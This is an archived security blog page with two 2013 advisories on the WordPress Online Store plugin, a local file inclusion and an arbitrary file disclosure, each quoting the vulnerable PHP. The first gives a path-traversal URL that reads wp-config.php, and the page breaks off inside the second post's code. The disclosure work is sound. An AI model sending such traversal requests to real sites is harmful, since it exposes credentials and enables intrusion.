<!DOCTYPE html>
<!--[if IE 6]>
<html id="ie6" lang="en-US">
<![endif]-->
<!--[if IE 7]>
<html id="ie7" lang="en-US">
<![endif]-->
<!--[if IE 8]>
<html id="ie8" lang="en-US">
<![endif]-->
<!--[if !(IE 6) | !(IE 7) | !(IE 8)  ]><!-->
<html lang="en-US">
<!--<![endif]-->
<head>
<base href="https://charlieeriksen.github.io" />

<meta charset="UTF-8" />
<meta name="viewport" content="initial-scale=1.0, width=device-width" />
<title>February | 2013 | ceriksen.com</title>

<link rel="stylesheet" type="text/css" media="all" href="https://charlieeriksen.github.io/wp-content/themes/simplex/style.css" />

<!--[if lt IE 9]>
<script src="https://charlieeriksen.github.io/wp-content/themes/simplex/js/html5.js" type="text/javascript"></script>
<script src="https://charlieeriksen.github.io/wp-content/themes/simplex/js/css3-mediaqueries.js"></script>
<![endif]-->


<link rel='stylesheet' id='crayon-css'  href='https://charlieeriksen.github.io/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=2.5.0' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-theme-twilight-css'  href='https://charlieeriksen.github.io/wp-content/plugins/crayon-syntax-highlighter/themes/twilight/twilight.css?ver=2.5.0' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://charlieeriksen.github.io/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=2.5.0' type='text/css' media='all' />
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/jquery/jquery.js?ver=1.10.2'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var quicktagsL10n = {"closeAllOpenTags":"Close all open tags","closeTags":"close tags","enterURL":"Enter the URL","enterImageURL":"Enter the URL of the image","enterImageDescription":"Enter a description of the image","fullscreen":"fullscreen","toggleFullscreen":"Toggle fullscreen mode","textdirection":"text direction","toggleTextdirection":"Toggle Editor Text Direction"};
/* ]]> */
</script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/quicktags.min.js?ver=3.8.3'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"2.5.0","is_admin":"0","ajaxurl":"http:\/\/ceriksen.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
var CrayonTagEditorSettings = {"home_url":"http:\/\/ceriksen.com","css":"crayon-te","css_selected":"crayon-selected","code_css":"#crayon-code","url_css":"#crayon-url","url_info_css":"#crayon-te-url-info","lang_css":"#crayon-lang","title_css":"#crayon-title","mark_css":"#crayon-mark","range_css":"#crayon-range","inline_css":"crayon-inline","inline_hide_css":"crayon-hide-inline","inline_hide_only_css":"crayon-hide-inline-only","hl_css":"#crayon-highlight","switch_html":"#content-html","switch_tmce":"#content-tmce","tinymce_button":"a.mce_crayon_tinymce","submit_css":"#crayon-te-ok","cancel_css":"#crayon-te-cancel","content_css":"#crayon-te-content","dialog_title_css":"#crayon-te-title","submit_wrapper_css":"#crayon-te-submit-wrapper","data_value":"data-value","attr_sep":":","css_sep":"_","fallback_lang":"default","dialog_title_add":"Add Crayon Code","dialog_title_edit":"Edit Crayon Code","submit_add":"Add","submit_edit":"Save","bar":"#crayon-te-bar","bar_content":"#crayon-te-bar-content","extensions":{"scpt":"applescript","applescript":"applescript","swf":"as","fla":"as","cs":"c#","h":"c++","hh":"c++","hpp":"c++","hxx":"c++","h++":"c++","cc":"c++","cpp":"c++","cxx":"c++","c++":"c++","pas":"delphi","java":"java","class":"java","jar":"java","mv":"miva","mvc":"miva","mvt":"miva","m":"objc","mm":"objc","pl":"perl","py":"python","pyw":"python","pyc":"python","pyo":"python","pyd":"python","rb":"ruby","rbx":"ruby","rhtml":"ruby","vbs":"vb"}};
var CrayonSyntaxSettings = {"version":"2.5.0","is_admin":"0","ajaxurl":"http:\/\/ceriksen.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.te.min.js?ver=2.5.0'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-content/themes/simplex/lib/js/jquery.fitvids.js?ver=3.8.3'></script>

 

<script type="text/javascript">
var _gaq = _gaq || [];
_gaq.push(['_setAccount', 'UA-32892239-1']);
_gaq.push(['_trackPageview']);
(function() {
var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
})();
</script>

	<script type="text/javascript">
		jQuery(document).ready(function(){
			jQuery("#page").fitVids();	 
		});
	</script>	<style type="text/css">
			#site-title a,
		#site-description {
			color: #e6941e !important;
		}
		</style>
	
</head>

<body lang="en" class="archive date  single-author">
<div id="page" class="hfeed">
	<header id="branding" role="banner">
		<hgroup>
			<h1 id="site-title"><a href="https://charlieeriksen.github.io/" title="ceriksen.com" rel="home">ceriksen.com</a></h1>
			<h2 id="site-description"></h2>
						
							<form role="search" method="get" id="searchform" class="searchform" action="https://charlieeriksen.github.io/">
				<div>
					<label class="screen-reader-text" for="s">Search for:</label>
					<input type="text" value="" name="s" id="s" />
					<input type="submit" id="searchsubmit" value="Search" />
				</div>
			</form>					</hgroup>
		
		<nav id="access" role="navigation">
			<h2 class="assistive-text">Main menu</h2>
			<div class="skip-link screen-reader-text"><a href="#content" title="Skip to content">Skip to content</a></div>

			<div class="menu"><ul><li ><a href="https://charlieeriksen.github.io/">Home</a></li></ul></div>

		</nav><!-- #access -->
		<div class="clear"></div>
	</header><!-- #branding -->

	<div id="main">
		<section id="primary">
			<div id="content" role="main">

			
				<header class="page-header">
					<h2 class="page-title">
						Monthly Archives: <span>February 2013</span>					</h2>
				</header>

				
					<nav id="nav-above">
		<h2 class="assistive-text">Post navigation</h2>

	
	</nav><!-- #nav-above -->
	
								
					
<article id="post-173" class="post-173 post type-post status-publish format-standard hentry category-advisories tag-lfi tag-wordpress-plugin tag-wp-online-store">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2013/02/18/wordpress-online-store-local-file-inclusion-vulnerability/" title="10:44 am" rel="bookmark" class="entry-date"><time datetime="2013-02-18T10:44:58+00:00" pubdate>February 18, 2013</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2013/02/18/wordpress-online-store-local-file-inclusion-vulnerability/" title="Permalink to WordPress Online Store local file inclusion vulnerability" rel="bookmark">WordPress Online Store local file inclusion vulnerability</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong></p>
<p><a href="http://secunia.com/advisories/50836/">Secunia Advisory SA50836</a></p>
<p><strong>Analysis of vulnerability</strong></p>
<p>The WP Online Store exposes a shortcode for displaying the store, which is declared in <a href="http://plugins.trac.wordpress.org/browser/wp-online-store/trunk/core.php?rev=570208">core.php</a>:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9877857516443266518" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
/* front end begins here */
function WP_online_store()
{
    //global $currencies,$currency,$messageStack,$tree,$categories_string, $cPath_array;
    //global $request_type, $session_started, $SID;
    if (!isset($_REQUEST['slug'])) {
        include(WP_PLUGIN_DIR.'/'.basename(dirname(__FILE__)).'/index.php');
    }
    if ($_REQUEST['slug']) {
        include(WP_PLUGIN_DIR.'/'.basename(dirname(__FILE__)).'/'.$_REQUEST['slug']);
    }

}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9877857516443266518-192">192</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877857516443266518-193">193</div><div class="crayon-num" data-line="crayon-53c9877857516443266518-194">194</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877857516443266518-195">195</div><div class="crayon-num" data-line="crayon-53c9877857516443266518-196">196</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877857516443266518-197">197</div><div class="crayon-num" data-line="crayon-53c9877857516443266518-198">198</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877857516443266518-199">199</div><div class="crayon-num" data-line="crayon-53c9877857516443266518-200">200</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877857516443266518-201">201</div><div class="crayon-num" data-line="crayon-53c9877857516443266518-202">202</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877857516443266518-203">203</div><div class="crayon-num" data-line="crayon-53c9877857516443266518-204">204</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9877857516443266518-192"><span class="crayon-c">/* front end begins here */</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877857516443266518-193"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">WP_online_store</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c9877857516443266518-194"><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877857516443266518-195"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">//global $currencies,$currency,$messageStack,$tree,$categories_string, $cPath_array;</span></div><div class="crayon-line" id="crayon-53c9877857516443266518-196"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">//global $request_type, $session_started, $SID;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877857516443266518-197"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'slug'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9877857516443266518-198"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">include</span><span class="crayon-sy">(</span><span class="crayon-v">WP_PLUGIN_DIR</span><span class="crayon-sy">.</span><span class="crayon-s">'/'</span><span class="crayon-sy">.</span><span class="crayon-e">basename</span><span class="crayon-sy">(</span><span class="crayon-e">dirname</span><span class="crayon-sy">(</span><span class="crayon-i">__FILE__</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">'/index.php'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877857516443266518-199"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c9877857516443266518-200"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'slug'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877857516443266518-201"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">include</span><span class="crayon-sy">(</span><span class="crayon-v">WP_PLUGIN_DIR</span><span class="crayon-sy">.</span><span class="crayon-s">'/'</span><span class="crayon-sy">.</span><span class="crayon-e">basename</span><span class="crayon-sy">(</span><span class="crayon-e">dirname</span><span class="crayon-sy">(</span><span class="crayon-i">__FILE__</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">'/'</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'slug'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9877857516443266518-202"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877857516443266518-203">&nbsp;</div><div class="crayon-line" id="crayon-53c9877857516443266518-204"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0035 seconds] -->
<p></p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9877857531746750865" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
add_shortcode('WP_online_store', 'WP_online_store');</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9877857531746750865-222">222</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9877857531746750865-222"><span class="crayon-e">add_shortcode</span><span class="crayon-sy">(</span><span class="crayon-s">'WP_online_store'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'WP_online_store'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0006 seconds] -->
<p>If the &#8220;slug&#8221; request parameter isn&#8217;t defined, it will load the index page of the store. But if it is defined, it will load the relevant page which the user requests. It however does not sanitize that the &#8220;slug&#8221; is a WP Online Store file, which allows for a local file inclusion vulnerability if we create a post/page with the text &#8220;[WP_online_store]&#8220;, and submit a request with the slug set like this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9877857538278185746" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
http://192.168.80.130/wordpress/?slug=../../../wp-config.php</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9877857538278185746-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9877857538278185746-1"><span class="crayon-i">http</span><span class="crayon-o">:</span><span class="crayon-c">//192.168.80.130/wordpress/?slug=../../../wp-config.php</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0005 seconds] -->
<p>&nbsp;</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="https://charlieeriksen.github.io/tag/lfi/" rel="tag">LFI</a>, <a href="https://charlieeriksen.github.io/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>, <a href="https://charlieeriksen.github.io/tag/wp-online-store/" rel="tag">WP Online Store</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2013/02/18/wordpress-online-store-local-file-inclusion-vulnerability/#comments" title="Comment on WordPress Online Store local file inclusion vulnerability">1 Comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-173 -->

				
					
<article id="post-152" class="post-152 post type-post status-publish format-standard hentry category-advisories tag-file-disclosure tag-wordpress-plugin tag-wp-online-store">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2013/02/18/wordpress-online-store-arbitrary-file-disclosure/" title="10:42 am" rel="bookmark" class="entry-date"><time datetime="2013-02-18T10:42:48+00:00" pubdate>February 18, 2013</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2013/02/18/wordpress-online-store-arbitrary-file-disclosure/" title="Permalink to WordPress Online Store arbitrary file disclosure" rel="bookmark">WordPress Online Store arbitrary file disclosure</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong></p>
<p><a href="http://secunia.com/advisories/50836/">Secunia Advisory SA50836</a></p>
<p><strong>Analysis of vulnerability</strong></p>
<p>The plugin hooks two functions as a part of its core functionality in <a href="http://plugins.trac.wordpress.org/browser/wp-online-store/trunk/core.php?rev=570208">core.php</a> by adding an action for init and admin_init.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9877859ea5072406291" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
add_action('init', 'osc_session_init_fend'); // starts session
add_action('admin_init', 'osc_session_init'); // starts session</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9877859ea5072406291-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877859ea5072406291-4">4</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9877859ea5072406291-3"><span class="crayon-e">add_action</span><span class="crayon-sy">(</span><span class="crayon-s">'init'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'osc_session_init_fend'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-c">// starts session</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877859ea5072406291-4"><span class="crayon-e">add_action</span><span class="crayon-sy">(</span><span class="crayon-s">'admin_init'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'osc_session_init'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-c">// starts session</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0015 seconds] -->
<p>The first line calls into osc_session_init_fend whenever a WordPress page is loaded, in order to set up a session.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9877859eb1262730049" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
function osc_session_init_fend()
{
    session_name('osCsid');
    $request_type = (getenv('HTTPS') == 'on') ? 'SSL' : 'NONSSL';
    if (isset($_POST['osCsid'])) {

        session_id($_POST['osCsid']);

    } else if (($request_type == 'SSL') &amp;&amp; isset($_GET['osCsid']) ) {

        session_id($_GET['osCsid']);

    }
    //if (!session_id())
    session_start();
    ob_start();
    if ($_REQUEST['force']=='downloadnow') {
        header('Content-type: application/x-octet-stream');
        header('Content-disposition: attachment; filename=' . $_REQUEST['file']);

        readfile($_REQUEST['turl'] . $_REQUEST['file']);
        // unlink($_REQUEST['turl'] . $_REQUEST['backup_file']);

    }
    wp_enqueue_script('jquery');
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9877859eb1262730049-120">120</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877859eb1262730049-121">121</div><div class="crayon-num" data-line="crayon-53c9877859eb1262730049-122">122</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877859eb1262730049-123">123</div><div class="crayon-num" data-line="crayon-53c9877859eb1262730049-124">124</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877859eb1262730049-125">125</div><div class="crayon-num" data-line="crayon-53c9877859eb1262730049-126">126</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877859eb1262730049-127">127</div><div class="crayon-num" data-line="crayon-53c9877859eb1262730049-128">128</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877859eb1262730049-129">129</div><div class="crayon-num" data-line="crayon-53c9877859eb1262730049-130">130</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877859eb1262730049-131">131</div><div class="crayon-num" data-line="crayon-53c9877859eb1262730049-132">132</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877859eb1262730049-133">133</div><div class="crayon-num" data-line="crayon-53c9877859eb1262730049-134">134</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877859eb1262730049-135">135</div><div class="crayon-num" data-line="crayon-53c9877859eb1262730049-136">136</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877859eb1262730049-137">137</div><div class="crayon-num" data-line="crayon-53c9877859eb1262730049-138">138</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877859eb1262730049-139">139</div><div class="crayon-num" data-line="crayon-53c9877859eb1262730049-140">140</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877859eb1262730049-141">141</div><div class="crayon-num" data-line="crayon-53c9877859eb1262730049-142">142</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877859eb1262730049-143">143</div><div class="crayon-num" data-line="crayon-53c9877859eb1262730049-144">144</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877859eb1262730049-145">145</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9877859eb1262730049-120"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">osc_session_init_fend</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877859eb1262730049-121"><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9877859eb1262730049-122"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">session_name</span><span class="crayon-sy">(</span><span class="crayon-s">'osCsid'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877859eb1262730049-123"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">request_type</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span 